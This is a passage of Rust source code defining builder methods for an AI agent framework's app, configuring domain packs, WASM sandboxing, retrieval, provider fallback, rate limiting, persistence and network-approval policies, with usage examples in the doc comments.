    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .domain_pack(coding_pack("/project/dir"))  // ← one-line domain switch
    ///     .build()?;
    /// ```
    pub fn domain_pack(mut self, pack: DomainPack) -> Self {
        self.domain_packs.push(pack);
        self
    }

    /// Add multiple domain packs for mixed domain configuration.
    ///
    /// When multiple packs are combined, the merge logic ensures:
    /// - Tools: union (deduplicated by name)
    /// - Permissions: strictest wins (safety first)
    /// - Context sources: all inject
    /// - System prompt: concatenated with section headers
    ///
    /// Example (coding + research):
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .domain_packs(vec![coding_pack("/project"), research_pack()])
    ///     .build()?;
    /// ```
    pub fn domain_packs(mut self, packs: Vec<DomainPack>) -> Self {
        self.domain_packs.extend(packs);
        self
    }

    /// Set the owning user id — namespaces cross-session habits/preferences in
    /// the memory tiers. Facts with this user id are recalled across sessions
    /// (the "越用越好用" engine). Optional; when unset, memory is session-scoped.
    pub fn user_id(mut self, user_id: impl Into<String>) -> Self {
        self.user_id = Some(user_id.into());
        self
    }

    /// Add a domain pack from a PackSource.
    ///
    /// Uses the PackRegistry to install and load the pack from the given source.
    /// This is the programmatic equivalent of `oneai pack install <source>`.
    ///
    /// **Usage**:
    /// ```ignore
    /// let registry = oneai_domain::PackRegistry::default_path();
    /// let source = oneai_domain::PackSource::Git {
    ///     repo_url: "https://github.com/oneai-project/oneai-pack-devops.git".to_string(),
    ///     ref_: None,
    /// };
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .domain_pack_from_source(&source, ".")  // ← install + load
    ///     .build()?;
    /// ```
    pub fn domain_pack_from_source(
        mut self,
        source: &oneai_domain::PackSource,
        project_dir: &str,
    ) -> Self {
        let registry = oneai_domain::PackRegistry::default_path();
        let pack_name = registry.install(source);
        if let Ok(name) = pack_name {
            if let Ok(pack) = registry.load_installed(&name, project_dir) {
                self.domain_packs.push(pack);
            }
        }
        self
    }

    /// Set the A2A client for inter-agent communication.
    ///
    /// The A2A client enables the OneAI agent to discover and communicate
    /// with remote A2A agents. This allows the agent to delegate tasks to
    /// specialized remote agents and receive results.
    ///
    /// **Usage**:
    /// ```ignore
    /// let a2a_client = A2AClient::new("https://remote-agent.example.com");
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .a2a_client(Arc::new(a2a_client))  // ← enable A2A inter-agent communication
    ///     .build()?;
    /// ```
    pub fn a2a_client(mut self, client: Arc<A2AClient>) -> Self {
        self.a2a_client = Some(client);
        self
    }

    /// Set the WASM runtime for sandboxed tool execution.
    ///
    /// The WASM runtime enables:
    /// - WASM module tools (loaded from .wasm files or bytes)
    /// - WASM action templates (compute, sort, filter, extract)
    /// - Code-as-action execution in a secure sandbox
    ///
    /// **Usage**:
    /// ```ignore
    /// let wasm_runtime = Arc::new(WasmRuntime::new(WasmRuntimeConfig::default())?);
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .wasm_runtime(wasm_runtime)  // ← enable WASM sandbox
    ///     .build()?;
    /// ```
    pub fn wasm_runtime(mut self, runtime: Arc<WasmRuntime>) -> Self {
        self.wasm_runtime = Some(runtime);
        self
    }

    /// Use a WASM runtime with default configuration.
    ///
    /// Default: strict pure-computation sandbox (no WASI, 1MB memory, 100K fuel).
    /// Also registers WASM action tools (compute, sort, filter, extract).
    pub fn default_wasm_runtime(self) -> Self {
        let runtime = WasmRuntime::with_defaults().expect("WASM runtime creation should succeed");
        let app = self.wasm_runtime(Arc::new(runtime));

        // Register WASM action tools
        app.register_wasm_action_tools()
    }

    /// Use a WASM runtime with custom configuration.
    pub fn wasm_runtime_with_config(mut self, config: WasmRuntimeConfig) -> Self {
        let runtime = WasmRuntime::new(config).expect("WASM runtime creation should succeed");
        self.wasm_runtime = Some(Arc::new(runtime));
        self.register_wasm_action_tools()
    }

    /// Register WASM action tools (compute, sort, filter, extract).
    ///
    /// These are always available when WASM runtime is configured.
    /// They provide safe pure-computation alternatives to ShellTool
    /// for mathematical operations, data sorting, filtering, and extraction.
    fn register_wasm_action_tools(self) -> Self {
        // WASM action tools will be registered in build() when the
        // tool registry is available. We store a flag to indicate
        // that WASM action tools should be registered.
        self
    }

    /// Set the WASM module registry (for named module lifecycle management).
    ///
    /// The registry provides module registration, health checking,
    /// version tracking, and hot-reload capabilities.
    pub fn wasm_module_registry(mut self, registry: WasmModuleRegistry) -> Self {
        self.wasm_module_registry = Some(registry);
        self
    }

    /// Use default WASM module registry with the configured runtime.
    ///
    /// Auto-creates a registry if a WASM runtime is configured.
    /// If no runtime is configured, this is a no-op.
    pub fn default_wasm_module_registry(self) -> Self {
        if let Some(runtime) = &self.wasm_runtime {
            let registry = WasmModuleRegistry::new(runtime.clone());
            self.wasm_module_registry(registry)
        } else {
            self
        }
    }

    /// Set the WASM resource monitor (for execution metrics tracking).
    ///
    /// The monitor records per-module execution metrics (calls, fuel,
    /// time, errors) and emits resource events.
    pub fn wasm_resource_monitor(mut self, monitor: Arc<WasmResourceMonitor>) -> Self {
        self.wasm_resource_monitor = Some(monitor);
        self
    }

    /// Use default WASM resource monitor.
    ///
    /// Creates a monitor with the logging subscriber.
    pub fn default_wasm_resource_monitor(self) -> Self {
        self.wasm_resource_monitor(Arc::new(WasmResourceMonitor::new()))
    }

    // ─── Embedding Service Integration ──────────────────────────────────────────

    /// Set the embedding service for automatic embedding generation.
    ///
    /// When an embedding service is configured, embeddings are automatically
    /// computed for:
    /// - RAG document chunks (AutoEmbeddingDocumentIndex)
    /// - Memory entries (MemoryManager auto-embedding)
    /// - LTM context injection queries (semantic recall)
    ///
    /// **Usage**:
    /// ```ignore
    /// let embedding_service = Arc::new(FastEmbedService::new());
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .embedding_service(embedding_service)  // ← enable auto-embedding
    ///     .build()?;
    /// ```
    pub fn embedding_service(mut self, service: Arc<dyn EmbeddingService>) -> Self {
        self.embedding_service = Some(service);
        self
    }

    /// Configure embedding service via EmbeddingConfig (lazy creation).
    ///
    /// The embedding service is created at build time using the config.
    /// This is the recommended way to configure embeddings when you
    /// want the builder to manage service creation.
    ///
    /// **Usage**:
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .embedding_config(EmbeddingConfig::default())  // ← zero-config auto-detect
    ///     .build()?;
    ///
    /// // Or with OpenAI:
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .embedding_config(EmbeddingConfig::openai("sk-...".to_string()))
    ///     .build()?;
    /// ```
    pub fn embedding_config(mut self, config: EmbeddingConfig) -> Self {
        self.embedding_config = Some(config);
        self
    }

    /// Use the zero-config embedding service (auto-detect from environment).
    ///
    /// Probes, in order: an explicit embedding relay
    /// (`ONEAI_EMBEDDING_API_KEY` and `ONEAI_EMBEDDING_BASE_URL`), Voyage
    /// (`VOYAGE_API_KEY`), OpenAI (`OPENAI_API_KEY`), a reachable local
    /// Ollama, then FastEmbed when implemented. If nothing is available,
    /// resolves to `None` and memory recall falls back to keyword matching
    /// — never hard-fails on a missing key.
    pub fn default_embedding_service(self) -> Self {
        self.embedding_config(EmbeddingConfig::auto())
    }

    // ─── Default Retrieval Stack (oneai-vector) ───────────────────────────────

    /// Wire the framework's default in-memory retrieval stack into both the
    /// memory subsystem (real-ANN semantic recall via `InMemoryVectorBackend`)
    /// and, when an embedding service resolves, a default-stack RAG index
    /// (`AutoEmbeddingDocumentIndex` over `StandardRetrievalPipeline`: BM25 +
    /// dense → RRF). With no embedding service, memory recall stays keyword/
    /// brute-force and the RAG index is keyword-only (real BM25).
    ///
    /// This is the one-line zero-config enabler for real hybrid retrieval.
    /// Pass `oneai_vector::BgeRerankerOnnx` (or any `RerankerProvider`) via
    /// [`retrieval_reranker`](AppBuilder::retrieval_reranker) to add the
    /// second-stage rerank leg.
    pub fn default_retrieval_stack(mut self) -> Self {
        self.enable_default_retrieval_stack = true;
        self
    }

    /// Attach an app-supplied [`RetrievalBackend`] (e.g. Qdrant, which does
    /// dense + BM25 + RRF natively) for the RAG index. When set, it overrides
    /// the default in-memory stack for RAG; memory recall still uses the
    /// framework's `InMemoryVectorBackend` (or the backend wired via the
    /// memory path) unless the app also wires memory separately.
    pub fn retrieval_backend(mut self, backend: Arc<dyn RetrievalBackend>) -> Self {
        self.retrieval_backend = Some(backend);
        self
    }

    /// Attach a reranker for the default retrieval stack (applied at the last
    /// pipeline stage: top-150 → top-K). `BgeRerankerOnnx` (under `ort`) is the
    /// reference implementation; cloud rerankers (Cohere, Voyage) implement
    /// `RerankerProvider` too.
    pub fn retrieval_reranker(mut self, reranker: Arc<dyn RerankerProvider>) -> Self {
        self.reranker = Some(reranker);
        self
    }

    // ─── Cost & Usage Management ────────────────────────────────────────────

    /// Set a custom usage tracker.
    ///
    /// **Usage**:
    /// ```ignore
    /// let usage_tracker = Arc::new(InMemoryUsageTracker::new());
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .usage_tracker(usage_tracker)  // ← enable usage tracking
    ///     .build()?;
    /// ```
    pub fn usage_tracker(mut self, tracker: Arc<dyn UsageTracker>) -> Self {
        self.usage_tracker = Some(tracker);
        self
    }

    /// Use the default in-memory usage tracker (no persistence).
    ///
    /// Suitable for single-process sessions. For persistent usage tracking,
    /// use `.sqlite_usage_tracker()` instead.
    pub fn default_usage_tracker(self) -> Self {
        self.usage_tracker(Arc::new(InMemoryUsageTracker::new()))
    }

    /// Use a SQLite-backed usage tracker (persistent across restarts).
    ///
    /// Shares the same database as `SqliteSessionStore` if configured,
    /// otherwise creates a new database at `~/.oneai/oneai.db`.
    ///
    /// **Usage**:
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .sqlite_persistence()       // ← session persistence
    ///     .sqlite_usage_tracker()     // ← usage persistence
    ///     .build()?;
    /// ```
    pub fn sqlite_usage_tracker(mut self) -> Self {
        let tracker = if let Some(store) = &self.sqlite_store {
            Arc::new(oneai_persistence::SqliteUsageTracker::from_store(store))
        } else {
            Arc::new(oneai_persistence::SqliteUsageTracker::with_defaults())
        };
        self.usage_tracker = Some(tracker);
        self
    }

    /// Set a custom rate limiter.
    ///
    /// **Usage**:
    /// ```ignore
    /// let rate_limiter = Arc::new(TokenWindowRateLimiter::with_common_limits());
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .rate_limiter(rate_limiter)  // ← enable rate limiting
    ///     .build()?;
    /// ```
    pub fn rate_limiter(mut self, limiter: Arc<dyn RateLimiter>) -> Self {
        self.rate_limiter = Some(limiter);
        self
    }

    /// Use the default rate limiter (60 RPM / 1000 RPH global).
    ///
    /// No per-provider overrides. For provider-specific limits,
    /// use `.rate_limit_config(RateLimitConfig::with_common_provider_limits())`.
    pub fn default_rate_limiter(self) -> Self {
        self.rate_limiter(Arc::new(TokenWindowRateLimiter::new()))
    }

    /// Configure rate limiter settings (for auto-creation at build time).
    pub fn rate_limit_config(mut self, config: RateLimitConfig) -> Self {
        self.rate_limit_config = Some(config);
        self
    }

    /// Set a custom circuit breaker.
    ///
    /// **Usage**:
    /// ```ignore
    /// let circuit_breaker = Arc::new(ThresholdCircuitBreaker::new());
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .circuit_breaker(circuit_breaker)  // ← enable failover
    ///     .build()?;
    /// ```
    pub fn circuit_breaker(mut self, breaker: Arc<dyn CircuitBreaker>) -> Self {
        self.circuit_breaker = Some(breaker);
        self
    }

    /// Use the default circuit breaker (5 failures → open, 3 successes → close, 60s open duration).
    pub fn default_circuit_breaker(self) -> Self {
        self.circuit_breaker(Arc::new(ThresholdCircuitBreaker::new()))
    }

    /// Configure circuit breaker settings (for auto-creation at build time).
    pub fn circuit_breaker_config(mut self, config: CircuitBreakerConfig) -> Self {
        self.circuit_breaker_config = Some(config);
        self
    }

    // ─── Provider Pool (Multi-Provider Fallback) ────────────────────────────────

    /// Set a provider pool for multi-provider fallback orchestration.
    ///
    /// When a primary provider fails (network errors, API errors, timeouts,
    /// circuit breaker opens, rate limits exceeded), the pool automatically
    /// falls over to alternative providers without manual intervention.
    ///
    /// ProviderPool implements `LlmProvider`, so it replaces the single
    /// provider in the App. If both `provider()` and `provider_pool()` are
    /// set, the pool takes precedence.
    ///
    /// **Usage**:
    /// ```ignore
    /// let pool = ProviderPool::new(
    ///     vec![
    ///         ProviderEntry::new("anthropic", anthropic_provider, 0),
    ///         ProviderEntry::new("openai", openai_provider, 1),
    ///         ProviderEntry::new("ollama", ollama_provider, 2),
    ///     ],
    ///     ProviderPoolConfig::default(),
    /// ).with_circuit_breaker(cb).with_rate_limiter(rl).with_usage_tracker(ct);
    ///
    /// let app = AppBuilder::new()
    ///     .provider_pool(Arc::new(pool))  // ← enable multi-provider fallback
    ///     .build()?;
    /// ```
    pub fn provider_pool(mut self, pool: Arc<ProviderPool>) -> Self {
        self.provider_pool = Some(pool);
        self
    }

    /// Configure provider pool settings (for auto-creation at build time).
    ///
    /// The pool is created at build time using the given configuration.
    /// If a circuit breaker, rate limiter, or usage tracker are also
    /// configured, they are automatically wired into the pool.
    ///
    /// **Usage**:
    /// ```ignore
    /// let config = ProviderPoolConfig::anthropic_primary(
    ///     Some(std::env::var("ANTHROPIC_API_KEY").ok()),
    ///     Some(std::env::var("OPENAI_API_KEY").ok()),
    /// );
    ///
    /// let app = AppBuilder::new()
    ///     .provider_pool_config(config)  // ← configure pool
    ///     .default_circuit_breaker()     // ← wire into pool
    ///     .default_rate_limiter()        // ← wire into pool
    ///     .default_usage_tracker()        // ← wire into pool
    ///     .build()?;
    /// ```
    pub fn provider_pool_config(mut self, config: ProviderPoolConfig) -> Self {
        self.provider_pool_config = Some(config);
        self
    }

    /// Use the default Anthropic-primary provider pool.
    ///
    /// Creates a fallback chain: Anthropic Sonnet → OpenAI gpt-4o → Ollama qwen2.5.
    /// API keys are read from environment variables (ANTHROPIC_API_KEY, OPENAI_API_KEY).
    /// Ollama is always available if the local server is running.
    pub fn default_provider_pool_anthropic(self) -> Self {
        let anthropic_key = std::env::var("ANTHROPIC_API_KEY").ok();
        let openai_key = std::env::var("OPENAI_API_KEY").ok();
        self.provider_pool_config(ProviderPoolConfig::anthropic_primary(
            anthropic_key,
            openai_key,
        ))
    }

    /// Use the default OpenAI-primary provider pool.
    ///
    /// Creates a fallback chain: OpenAI gpt-4o → Anthropic Sonnet → Ollama qwen2.5.
    pub fn default_provider_pool_openai(self) -> Self {
        let openai_key = std::env::var("OPENAI_API_KEY").ok();
        let anthropic_key = std::env::var("ANTHROPIC_API_KEY").ok();
        self.provider_pool_config(ProviderPoolConfig::openai_primary(
            openai_key,
            anthropic_key,
        ))
    }

    /// Use the default local-first provider pool.
    ///
    /// Creates a fallback chain: Ollama → OpenAI gpt-4o-mini → Anthropic Haiku.
    /// Best for offline-first or low-cost scenarios.
    pub fn default_provider_pool_local_first(self) -> Self {
        let openai_key = std::env::var("OPENAI_API_KEY").ok();
        let anthropic_key = std::env::var("ANTHROPIC_API_KEY").ok();
        self.provider_pool_config(ProviderPoolConfig::local_first(openai_key, anthropic_key))
    }

    // ─── Smart Router ────────────────────────────────────────────────────

    /// Set the smart router for intelligent model selection.
    ///
    /// The smart router considers cost, latency, quality, provider health,
    /// budget constraints, and context window limits when selecting which
    /// model/provider to use for each inference call.
    ///
    /// When attached to a ProviderPool, the router determines which provider
    /// to try first (instead of always trying the primary). This enables
    /// intelligent primary selection: e.g., "this is a simple task, start
    /// with Haiku even though Opus is primary".
    ///
    /// **Usage**:
    /// ```ignore
    /// let router = SmartRouter::new(
    ///     ModelRouter::with_defaults(config),
    ///     SmartRouteConfig::balanced(),
    /// );
    ///
    /// let app = AppBuilder::new()
    ///     .default_provider_pool_anthropic()
    ///     .smart_router(Arc::new(router))  // ← enable intelligent routing
    ///     .build()?;
    /// ```
    pub fn smart_router(mut self, router: Arc<SmartRouter>) -> Self {
        self.smart_router = Some(router);
        self
    }

    /// Configure smart routing settings (for auto-creation at build time).
    ///
    /// If a smart router is not explicitly set, but a smart route config is
    /// provided, a SmartRouter is auto-created at build time using the
    /// configured ModelRouter defaults.
    ///
    /// **Usage**:
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .default_provider_pool_anthropic()
    ///     .smart_route_config(SmartRouteConfig::latency_optimized())  // ← latency-first routing
    ///     .build()?;
    /// ```
    pub fn smart_route_config(mut self, config: SmartRouteConfig) -> Self {
        self.smart_route_config = Some(config);
        self
    }

    /// Use balanced smart routing (default).
    ///
    /// Balances latency and quality. Uses regex rules
    /// as first-pass, then multi-factor scoring if regex fails validation.
    pub fn default_smart_router_balanced(self) -> Self {
        self.smart_route_config(SmartRouteConfig::balanced())
    }

    /// Use latency-optimized smart routing.
    ///
    /// Minimizes latency above all else. Faster models are preferred,
    /// slow models are avoided when latency tolerance is exceeded.
    pub fn default_smart_router_latency_optimized(self) -> Self {
        self.smart_route_config(SmartRouteConfig::latency_optimized())
    }

    /// Use quality-optimized smart routing.
    ///
    /// Maximizes quality above all else. Powerful models are preferred,
    /// cheap models are avoided unless budget constraints force downgrade.
    pub fn default_smart_router_quality_optimized(self) -> Self {
        self.smart_route_config(SmartRouteConfig::quality_optimized())
    }

    // ─── Token Counter & Context Manager ────────────────────────────────────

    /// Set a custom token counter for accurate token counting.
    ///
    /// The token counter provides model-aware, language-aware token estimation,
    /// improving accuracy over the simple ~4 chars/token heuristic.
    /// It's used by SmartRouter for context window validation,
    /// ContextBudgetManager for budget checks, and ContextManager for trimming.
    ///
    /// **Usage**:
    /// ```ignore
    /// let token_counter = Arc::new(HeuristicTokenCounter::new());
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .token_counter(token_counter)  // ← enable accurate token counting
    ///     .build()?;
    /// ```
    pub fn token_counter(mut self, tc: Arc<dyn TokenCounter>) -> Self {
        self.token_counter = Some(tc);
        self
    }

    /// Use the default heuristic token counter (improved per-provider estimation).
    ///
    /// Includes profiles for 12 known models (Anthropic, OpenAI, Google, Ollama families).
    /// Improves over the flat ~4 chars/token heuristic by:
    /// - Per-provider chars-per-token ratios (OpenAI 4.0, Anthropic 3.8, etc.)
    /// - CJK language detection (Chinese/Japanese/Korean: ~2 chars/token)
    /// - Per-message overhead (role markers, formatting)
    pub fn default_token_counter(self) -> Self {
        // gap P2 #13 — real BPE tokenization (tiktoken o200k), not the
        // chars-per-token heuristic.
        self.token_counter(Arc::new(oneai_core::TiktokenTokenCounter::new()))
    }

    /// Set a custom context manager for model-aware context trimming.
    ///
    /// The context manager orchestrates trimming based on the target model's
    /// context window. When SmartRouter selects a model, the context manager
    /// checks if the conversation fits and trims if necessary.
    ///
    /// **Usage**:
    /// ```ignore
    /// let token_counter = Arc::new(HeuristicTokenCounter::new());
    /// let context_manager = Arc::new(ContextManager::new(
    ///     token_counter.clone(),
    ///     ContextTrimmingStrategy::default(),
    /// ));
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .context_manager(context_manager)  // ← enable model-aware trimming
    ///     .build()?;
    /// ```
    pub fn context_manager(mut self, cm: Arc<ContextManager>) -> Self {
        self.context_manager = Some(cm);
        self
    }

    /// Configure context manager settings (for auto-creation at build time).
    ///
    /// If a context manager is not explicitly set, but a config is provided,
    /// a ContextManager is auto-created at build time using the configured
    /// TokenCounter (or a default HeuristicTokenCounter).
    ///
    /// **Usage**:
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .context_manager_config(ContextManagerConfig::truncate_oldest())  // ← TruncateOldest strategy
    ///     .build()?;
    /// ```
    pub fn context_manager_config(mut self, config: ContextManagerConfig) -> Self {
        self.context_manager_config = Some(config);
        self
    }

    /// Use the default context manager (TruncateOldest + HeuristicTokenCounter).
    ///
    /// This is the simplest way to enable model-aware context trimming.
    /// Uses TruncateOldest strategy (keep recent 6 turns, truncate older ones).
    pub fn default_context_manager(self) -> Self {
        self.context_manager_config(ContextManagerConfig::default())
    }

    // ─── Model Context Resolver (3-layer window resolution) ──────────────────

    /// Attach a custom 3-layer `ModelContextResolver` as the source of truth for
    /// model context-window sizes (L1 user config > L2 provider probe > L3
    /// built-in library). When set, it is attached to the token counter and
    /// context manager at build time.
    pub fn model_context_resolver(
        mut self,
        resolver: Arc<oneai_core::ModelContextResolver>,
    ) -> Self {
        self.model_context_resolver = Some(resolver);
        self
    }

    /// Toggle whether the provider's model-metadata endpoint is probed for the
    /// context window at warm-up (default `true`). Disable to skip network IO
    /// entirely and rely on L1 overrides + the built-in library.
    pub fn probe_context_windows(mut self, enabled: bool) -> Self {
        self.probe_context_windows = enabled;
        self
    }

    // ─── SQLite Persistence ────────────────────────────────────────────────

    /// Enable SQLite persistence (default path: ~/.oneai/oneai.db).
    ///
    /// This enables:
    /// - Memory persistence (STM + LTM entries)
    /// - Conversation persistence (multi-turn session resume)
    ///
    /// **Usage**:
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .sqlite_persistence()  // ← enable persistent sessions
    ///     .build()?;
    /// ```
    pub fn sqlite_persistence(mut self) -> Self {
        let store = Arc::new(SqliteSessionStore::with_defaults());
        self.sqlite_store = Some(store.clone());

        // Wire SqliteSessionStore into the MemoryManager
        if self.memory_manager.is_none() {
            let config = Self::memory_manager_config(self.core_memory_budget_tokens);
            self.memory_manager = Some(Arc::new(MemoryManager::with_persistence(config, store)));
        } else {
            // If a MemoryManager was already created (e.g., with_compressor_and_reflection),
            // we need to recreate it with persistence. Since we can't mutate Arc<MemoryManager>,
            // the user should use .sqlite_persistence() before .with_memory_reflection().
            tracing::warn!("sqlite_persistence() called after MemoryManager was created — \
                persistence will be stored separately but not wired into the existing MemoryManager. \
                For full integration, call .sqlite_persistence() before .with_memory_reflection().");
        }

        self
    }

    /// Enable SQLite persistence with a custom database path.
    ///
    /// **Usage**:
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .sqlite_persistence_at("/custom/path/oneai.db")  // ← custom path
    ///     .build()?;
    /// ```
    pub fn sqlite_persistence_at(mut self, path: &str) -> Self {
        let store = Arc::new(SqliteSessionStore::new(path));
        self.sqlite_store = Some(store.clone());

        // Wire SqliteSessionStore into the MemoryManager
        if self.memory_manager.is_none() {
            let config = Self::memory_manager_config(self.core_memory_budget_tokens);
            self.memory_manager = Some(Arc::new(MemoryManager::with_persistence(config, store)));
        }

        self
    }

    // ─── Working State (cross-session task continuation) ─────────────────────────

    /// Enable durable working-state persistence rooted at `root`. When set,
    /// the agent persists goal/steps/decisions/blockers to per-task append-only
    /// event logs under `<root>/tasks/`, so plan progress survives crashes and
    /// a brand-new session can discover and continue an unfinished task from a
    /// previous session.
    ///
    /// For coding domains, pass an in-repo path like `./.oneai` so the working
    /// state is git-trackable (free durability + reconciliation source). For
    /// assistant domains with no repo, pass `~/.oneai`.
    ///
    /// **Usage**:
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .working_state("./.oneai")  // ← durable working state
    ///     .build()?;
    /// ```
    pub fn working_state(mut self, root: impl Into<std::path::PathBuf>) -> Self {
        self.working_state_root = Some(root.into());
        self
    }

    /// Override the session-event store (issue #40 trajectory replay).
    ///
    /// By default the store is derived from [`working_state`](Self::working_state)'s
    /// root (`FileSessionEventStore` at `<root>/events/`); call this to inject
    /// a custom backend (e.g. an in-memory store in tests). The tap that feeds
    /// it is spawned at [`build`](Self::build) time whenever an engine bus is
    /// wired.
    pub fn session_event_store(
        mut self,
        store: Arc<dyn oneai_core::traits::SessionEventStore>,
    ) -> Self {
        self.session_event_store = Some(store);
        self
    }

    // ─── Cron Scheduler (Phase 3.2) ───────────────────────────────────────────

    /// Inject a durable cron scheduler (Phase 3.2). The scheduler is *held*
    /// on `App` (so future agent tools can query schedules) but its lifecycle
    /// is driven by the CLI (`cron serve` / `supervisor serve --with-cron`),
    /// which constructs the `CronSchedulerImpl` + a `CronRunner` that routes
    /// fired jobs into the gateway's `deliver_scheduled`. This seam is the
    /// one place `AppBuilder` touches the scheduler — pure setter, no side
    /// effects (the scheduler is started by the caller, not at build time).
    ///
    /// ```ignore
    /// use oneai_scheduler::CronSchedulerImpl;
    /// let sched = Arc::new(CronSchedulerImpl::new(store, runner));
    /// let app = AppBuilder::new().cron_provider(sched).build()?;
    /// ```
    pub fn cron_provider(mut self, scheduler: Arc<dyn oneai_core::traits::CronScheduler>) -> Self {
        self.cron_scheduler = Some(scheduler);
        self
    }

    // ─── Terminal Backend (Phase 3.3) ───────────────────────────────────────

    /// Set the app-level terminal backend (Phase 3.3). The trait seam lives in
    /// `oneai_tool::TerminalBackend` (`execute` / `snapshot` / `restore` /
    /// `cleanup(hibernate)`). The `ShellTool` owns its own backend (built via
    /// the DomainPack or `ShellTool::with_backend`); this is the app-level
    /// handle for out-of-band lifecycle — `oneai terminal exec / snapshot /
    /// restore / cleanup`. Default (unset): `ShellTool::new()` uses
    /// `LocalBackend` regardless.
    ///
    /// ```ignore
    /// use oneai_tool::LocalBackend;
    /// let app = AppBuilder::new()
    ///     .terminal_backend(std::sync::Arc::new(LocalBackend::new()))
    ///     .build()?;
    /// ```
    pub fn terminal_backend(mut self, backend: Arc<dyn oneai_tool::TerminalBackend>) -> Self {
        self.terminal_backend = Some(backend);
        self
    }

    /// Set the working directory the `code_interpreter` tool runs scripts in.
    ///
    /// Defaults to the process CWD. The directory is also the sandbox's
    /// project root — relative file operations inside a script resolve here,
    /// and it is added to the Seatbelt / bwrap write allow-list.
    pub fn code_working_dir(mut self, dir: std::path::PathBuf) -> Self {
        self.code_working_dir = Some(dir);
        self
    }

    /// Toggle the code-mode egress proxy (#28 Stage 1). Default `true` — the
    /// `code_interpreter` sandbox runs `LoopbackProxy` and scripts' outbound
    /// HTTPS is gated per-host via `InteractionRequest::NetworkApproval`. Set
    /// `false` on targets where a loopback proxy isn't wanted (the script
    /// sandbox then air-gaps to `NetworkPolicy::Denied`).
    pub fn network_proxy(mut self, enabled: bool) -> Self {
        self.network_proxy_enabled = enabled;
        self
    }

    /// How the egress proxy handles a CONNECT to an *unknown* host (neither
    /// allowed nor denied) — #28 Stage 6.
    ///
    /// - [`NetworkApprovalMode::Prompt`] (default): block on
    ///   `InteractionRequest::NetworkApproval` — the UI admits/denies, the
    ///   result is recorded.
    /// - [`NetworkApprovalMode::Defer`]: tunnel immediately and fire the
    ///   approval request on a background task ("先执行,后审批"). The user's
    ///   later reply records the host for *next* time. Use this for low-friction
    ///   flows where blocking would break the UX (long installs that need net
    ///   mid-way); a once-denied host is still blocked synchronously.
    /// - [`NetworkApprovalMode::Deny`]: auto-deny unknown hosts (strict).
    ///
    /// Approved/denied hosts persist across sessions when
    /// [`sqlite_persistence`](Self::sqlite_persistence) is enabled; otherwise
    /// they're session-scoped (in-memory).
    pub fn network_approval_mode(mut self, mode: oneai_tool::NetworkApprovalMode) -> Self {
        self.network_approval_mode = mode;
        self
    }

    /// Set the Guardian's `AskForApproval` policy (#28 Stage 2). A
    /// DomainPack's `PermissionProfile.approval_policy` overrides this at
    /// `build()` when a domain is configured; this setter is the domain-less
    /// default (e.g. `Never` for headless / CI runs).
    pub fn approval_policy(mut self, policy: oneai_core::ApprovalPolicy) -> Self {
        self.guardian_policy = policy;
        self
    }

    /// Set the trusted directories for `OnUntrustedDir` (#28 Stage 2). `None`
    /// (default) → trust the working dir only. Pass the project root (+ any
    /// sibling roots the agent may legitimately operate in).
    pub fn trusted_dirs(mut self, dirs: Vec<std::path::PathBuf>) -> Self {
        self.trusted_dirs = Some(dirs);
        self
    }

    /// #28 Stage 5 — override the file user-approved exec-policy amendments
    /// are persisted to (JSONL, one `ExecRule` per line). `None` (default) →
    /// `~/.oneai/rules/default.rules`. The file is created lazily on the first
    /// approved command.
    pub fn exec_rules_path(mut self, path: std::path::PathBuf) -> Self {
        self.exec_rules_path = Some(path);
        self
    }

    /// #28 Stage 5 — toggle the runtime amendment layer. Default `true`:
    /// approving a shell command records a full-argv `Allow` rule so future
    /// identical commands skip the prompt (and persist to
    /// [`Self::exec_rules_path`]). Pass `false` for the Stage-4 static posture
    /// (no recording, no persistence, exec-policy is DomainPack-declared only).
    pub fn with_exec_amendment(mut self, enabled: bool) -> Self {
        self.exec_amendment_enabled = enabled;
        self
    }

    /// Default amendments file: `~/.oneai/rules/default.rules` (mirrors the
    /// gateway / supervisor / working-state `~/.oneai` root convention).
    fn default_exec_rules_path() -> std::path::PathBuf {
        dirs::home_dir()
            .unwrap_or_else(|| std::path::PathBuf::from("."))
            .join(".oneai")
            .join("rules")
            .join("default.rules")
    }

    // ─── A2A Server Integration ──────────────────────────────────────────────────

    /// Enable A2A server hosting — expose OneAI agent capabilities via A2A protocol.
    ///
    /// When enabled, the App can serve its AgentCard and receive tasks from
    /// remote A2A agents. This makes OneAI both an A2A client (discovering
    /// remote agents) AND server (being discoverable).
    ///
    /// **Usage**:
    /// ```ignore
    /// let app = AppBuilder::new()
    ///     .provider(provider)
    ///     .a2a_server_host()  // ← enable A2A server hosting
    ///     .build()?;
    ///
    /// // The A2AServerHost is available for processing messages
    /// app.a2a_server_host().unwrap().process_message(msg).await;
    /// ```
    pub fn a2a_server_host(mut self) -> Self {
        self.a2a_server_host_enabled = true;
        self
    }

    /// Enable A2A server hosting with a custom port.
    ///
    /// Default port is 8080 if not specified.
    pub fn a2a_server_with_port(mut self, port: u16) -> Self {
        self.a2a_server_host_enabled = true;
        self.a2a_server_port = Some(port);
        self
    }

    /// Enable A2A server hosting with a custom AgentCard.
    ///
    /// Use this when the AgentCard needs to be manually configured
    /// instead of auto-generated from the DomainPack.
    pub fn a2a_server_with_card(mut self, card: AgentCard) -> Self {
        self.a2a_server_host_enabled = true;
        self.a2a_server_agent_card = Some(card);
        self
    }

